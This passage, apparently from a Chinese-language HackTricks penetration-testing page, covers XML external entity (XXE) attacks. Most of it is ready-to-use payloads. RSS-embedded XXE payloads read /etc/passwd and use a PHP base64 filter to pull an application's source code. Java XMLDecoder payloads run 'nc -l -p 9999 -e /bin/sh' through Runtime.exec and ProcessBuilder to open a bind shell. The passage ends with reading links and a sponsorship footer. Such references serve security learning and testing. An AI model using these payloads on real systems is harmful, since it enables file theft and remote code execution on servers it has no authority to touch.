### 读取文件
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### 读取源代码

使用 PHP base64 过滤器
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder是一个Java类，它根据XML消息创建对象。如果恶意用户可以让应用程序在调用**readObject**方法时使用任意数据，他将立即在服务器上获得代码执行权限。

### 使用Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## 工具

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## 更多资源

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
通过使用自己的外部 DTD 从 HTTP 中提取信息: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式:

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
